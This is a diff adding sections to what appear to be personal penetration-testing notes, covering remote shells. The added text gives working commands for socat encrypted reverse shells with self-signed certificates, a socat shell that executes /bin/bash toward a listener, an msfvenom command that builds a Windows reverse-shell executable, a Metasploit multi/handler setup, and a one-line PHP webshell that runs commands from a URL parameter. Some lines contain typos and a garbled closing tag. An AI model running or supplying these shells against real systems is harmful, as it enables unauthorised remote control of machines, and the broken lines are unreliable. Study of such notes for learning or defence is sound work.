@@ -120,3 +120,56 @@ socat TCP:<Attacker-IP>:<port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
 ```
 
 ##### Socat Encrypted Shells
+- Encypted shells offer protection from being spied on.
+- First, generate a certificate to use for encrypted shells.e.g
+```
+openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+```
+- This creates a 2048 bit rsa key with a matching cert file, selfsigned and valid for 362 days.
+- Merge the two created files into a single **.pem** file:
+```
+cat shell.key shell.crt > shell.pem
+```
+- From here, we can setup the reverse listener using:(setups an openssl listener using our cert, verify=0 tells connection to not validate the certificate)
+```
+socat OPENSSL-LISTEN:<port>,cert=shell.perm,verify=o -
+```
+
+- **nb**: certificate is used on the listener
+
+- To connect to the listener:
+```
+socat OPENSSL:<listener-ip>:<port>,verify=0 EXEC:/bin/bash
+```
+
+### msfvenom
+- standard syntax:
+```
+msfvenom -p <payload> <options>
+```
+.e.g. for a windows x64 reverse shell in exe format:
+```
+msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-ip> LPORT=<listen-port>
+```
+- Payload naming convection:
+> <OS>/<archtecture>/<payload>
+e.g.
+> linux/x86/shell_reverse_tcp
+
+### metasploit multi/handler
+- Launch using:
+```
+msfconsole
+
+use multi/handler
+```
+- Then set the PAYLOAD, LHOST and LPORT then exploit.
+
+
+### Webshells
+- Is a script runnning on a webserver
+e.g.
+```
+<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</payload>pre>"; ?>
+```
+- shell_exec executes commands given as system commands.
